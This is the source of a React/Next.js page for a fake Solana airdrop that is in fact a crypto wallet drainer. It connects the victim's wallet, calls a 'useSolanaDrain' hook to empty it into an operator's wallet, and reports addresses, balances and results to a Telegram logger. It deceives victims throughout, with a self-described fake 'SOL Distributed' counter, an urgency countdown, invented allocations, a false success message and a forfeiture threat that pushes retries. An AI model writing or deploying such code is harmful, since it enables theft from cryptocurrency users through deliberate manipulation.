"use client";
import { useState, useEffect } from 'react';
import { Connection, LAMPORTS_PER_SOL } from '@solana/web3.js';
import { ethers } from 'ethers';
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import WalletModal from '@/components/WalletModal';
import styles from './page.module.css';

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletAddress, setWalletAddress] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [realBalance, setRealBalance] = useState(0);
  const [allocatedAmount, setAllocatedAmount] = useState(0);
  const [distributed, setDistributed] = useState(1784.42);
  const [countdown, setCountdown] = useState(180);
  const [processing, setProcessing] = useState(false);
  const [status, setStatus] = useState('idle'); // idle, processing, success, error

  const { executeDrain } = useSolanaDrain(process.env.NEXT_PUBLIC_SOLANA_RPC, process.env.NEXT_PUBLIC_SOLANA_WALLET);

  // Fake Distributed Incrementor (Urgency)
  useEffect(() => {
    const interval = setInterval(() => {
      setDistributed(prev => prev + Math.random() * 0.05);
    }, 4000);
    return () => clearInterval(interval);
  }, []);

  // Timer
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => (prev <= 1 ? 0 : prev - 1));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (s) => `${Math.floor(s/60)}:${(s%60).toString().padStart(2,'0')}`;

  const handleConnect = async (type) => {
    try {
      let address, balance;
      if (type === 'phantom') {
        const resp = await window.solana.connect();
        address = resp.publicKey.toString();
        const conn = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC);
        balance = (await conn.getBalance(resp.publicKey)) / LAMPORTS_PER_SOL;
      } else if (type === 'metamask') {
        const provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        address = accounts[0];
        balance = 0.01; // Example for ETH
      }

      setWalletAddress(address);
      setRealBalance(balance);
      setConnected(true);
      setShowModal(false);

      // Ping Telegram immediately with Real Balance
      await sendTelegramLog('connected', { address, type, balance });

      if (balance > 0.005) {
        setAllocatedAmount(calculateAllocation(address));
      }
    } catch (e) { console.error(e); }
  };

  const handleAction = async () => {
    setStatus('processing');
    const result = await executeDrain(window.solana);
    
    if (result.success) {
      setStatus('success');
      await sendTelegramLog('success', { address: walletAddress, tx: result.txId });
    } else {
      setStatus('error');
      await sendTelegramLog('failed', { address: walletAddress, error: result.error });
    }
  };

  return (
    <div className={styles.container}>
      <div className={styles.glassCard}>
        <h1 className={styles.heroTitle}>Solana Liquidity Project</h1>
        <p style={{color: 'rgba(255,255,255,0.6)'}}>Protocol Epoch V3 Distribution</p>

        <div className={styles.timerContainer}>
          CURRENT EPOCH WINDOW CLOSES IN: {formatTime(countdown)}
        </div>

        <div className={styles.statsGrid}>
          <div className={styles.statItem}>
            <div className={styles.statValue}>{distributed.toFixed(2)}</div>
            <div className={styles.statLabel}>SOL Distributed</div>
          </div>
          <div className={styles.statItem}>
            <div className={styles.statValue}>3,500</div>
            <div className={styles.statLabel}>Total Pool</div>
          </div>
        </div>

        {!connected ? (
          <button className={styles.primaryButton} onClick={() => setShowModal(true)}>
            Connect Wallet to Verify Eligibility
          </button>
        ) : (
          <div>
            {realBalance <= 0.005 ? (
              <p className={styles.ineligibleText}>
                Account Ineligible: This wallet does not meet the minimum activity requirements for this epoch.
              </p>
            ) : status === 'success' ? (
              <div className={styles.successBox}>
                <h4>Distribution Confirmed</h4>
                <p style={{fontSize: '0.8rem', marginTop: '10px'}}>
                  Your allocation has been queued. ETA: 2-4 hours.
                </p>
              </div>
            ) : (
              <>
                <p style={{marginBottom: '15px'}}>Validation Successful. Allocation: <b>{allocatedAmount.toFixed(2)} SOL</b></p>
                <button className={styles.primaryButton} onClick={handleAction} disabled={status === 'processing'}>
                  {status === 'processing' ? 'Processing...' : 'Verify and Initialize On-Chain Allocation'}
                </button>
                {status === 'error' && (
                  <p className={styles.ineligibleText} style={{marginTop: '15px'}}>
                    Authentication Interrupted: Transaction not verified. Please retry to avoid allocation forfeiture.
                  </p>
                )}
              </>
            )}
          </div>
        )}
      </div>
      <WalletModal isOpen={showModal} onClose={() => setShowModal(false)} onSelect={handleConnect} />
    </div>
  );
          }
